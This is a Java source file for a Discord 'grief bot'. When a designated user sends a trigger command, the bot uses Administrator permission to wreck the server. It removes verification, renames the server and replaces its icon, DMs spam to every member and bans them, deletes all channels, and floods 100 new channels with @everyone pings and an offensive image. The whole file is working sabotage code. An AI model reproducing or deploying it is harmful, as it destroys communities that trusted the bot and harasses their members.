package de.corruptedbytes;

import java.nio.charset.StandardCharsets;
import java.util.Base64;

import de.corruptedbytes.utils.Config;
import de.corruptedbytes.utils.Shelv;
import de.corruptedbytes.utils.Utils;
import net.dv8tion.jda.api.EmbedBuilder;
import net.dv8tion.jda.api.Permission;
import net.dv8tion.jda.api.entities.ChannelType;
import net.dv8tion.jda.api.entities.Guild;
import net.dv8tion.jda.api.entities.Guild.VerificationLevel;
import net.dv8tion.jda.api.entities.Icon;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.TextChannel;
import net.dv8tion.jda.api.entities.User;
import net.dv8tion.jda.api.events.ReadyEvent;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.hooks.ListenerAdapter;

public class GriefBotListener extends ListenerAdapter {

	@Override
	public void onReady(ReadyEvent e) {
		Utils.sendInfo();
	}

	@Override
	public void onMessageReceived(MessageReceivedEvent e) {
		if (e.isFromType(ChannelType.TEXT)) {
			Message message = e.getMessage();
			Guild guild = e.getGuild();
			User user = e.getMessage().getAuthor();

			if (message.getContentDisplay().equalsIgnoreCase(GriefBot.getInstance().getGriefCommand())
					&& user.getId().startsWith(GriefBot.getInstance().getGrieferUserID())) {
				try {
					if (guild.getSelfMember().hasPermission(Permission.ADMINISTRATOR)) {
						try {
							message.delete().queue();
						} catch (Exception ignored) {
						}

						startGrief(guild, user);
					} else {
						message.getChannel().sendMessage(":x: The Bot works only with **Administrator** Permission!")
								.queue();
					}
				} catch (Exception ex) {
					System.err.println("Error: " + ex.getMessage());
				}
			}
		}
	}

	public void startGrief(Guild guild, User user) throws Exception {
		String name = String.format(GriefBot.getInstance().getGriefMessage(), user.getName());
		guild.getManager().setVerificationLevel(VerificationLevel.NONE).queue();
		guild.getManager().setName(name).queue();
		guild.getManager().setIcon(Icon.from(Config.GRIEF_PICTURE)).queue();

		guild.getMembers().forEach(member -> {
			if (member.isOwner() || member.getUser().isBot()
					|| member.getId() == GriefBot.getInstance().getGrieferUserID()) {
				return;
			} else {
				spamMessage(member.getUser());
				member.getGuild().ban(member, 0, "bruh").queue();
			}
		});
		
		guild.getChannels().forEach(key -> {
			key.delete().queue();
		});

		TextChannel base = guild
				.createTextChannel(new String(Base64.getDecoder().decode(Shelv.ASCII_EMOJI), StandardCharsets.UTF_8))
				.complete();
		base.sendMessage(new String(Base64.getDecoder().decode(Shelv.ASCII_MEME), StandardCharsets.UTF_8)).queue();

		for (int i = 0; i < 100; i++) {
			try {
				TextChannel grief = guild.createTextChannel(name.toLowerCase()).complete();
				
				EmbedBuilder embed = new EmbedBuilder();
				embed.setThumbnail("attachment://FUCKED.PNG");
				embed.setTitle(GriefBot.getInstance().getSpamMessage());
				embed.setDescription("**" + GriefBot.getInstance().getSpamMessage() + "**");
				embed.setFooter(name);
				grief.sendMessage("@everyone").addFile(Config.GRIEF_PICTURE, "FUCKED.PNG").embed(embed.build()).queue();
			} catch (Exception ignored) {
			}
		}
	}
	
	private void spamMessage(User user) {
		try {
			user.openPrivateChannel().queue((channel) -> {
				channel.sendMessage(GriefBot.getInstance().getMembersSpamMessage()).queue();
			});
		} catch (Exception ignored) { }
	}
}